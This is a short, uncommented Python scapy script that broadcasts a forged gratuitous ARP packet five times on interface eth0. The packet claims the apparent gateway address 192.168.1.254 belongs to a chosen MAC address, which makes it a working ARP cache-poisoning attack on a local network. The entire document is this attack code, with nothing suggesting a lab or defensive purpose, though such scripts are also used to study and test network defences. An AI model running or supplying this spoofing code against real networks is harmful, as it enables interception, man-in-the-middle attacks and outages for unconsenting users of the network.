from scapy.all import *
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
arp = ARP(psrc="192.168.1.254", pdst="192.168.1.254", hwsrc="ec:f4:bb:60:40:62")
toSend = ether/arp
toSend.show()
sendp(toSend, iface='eth0', count=5)
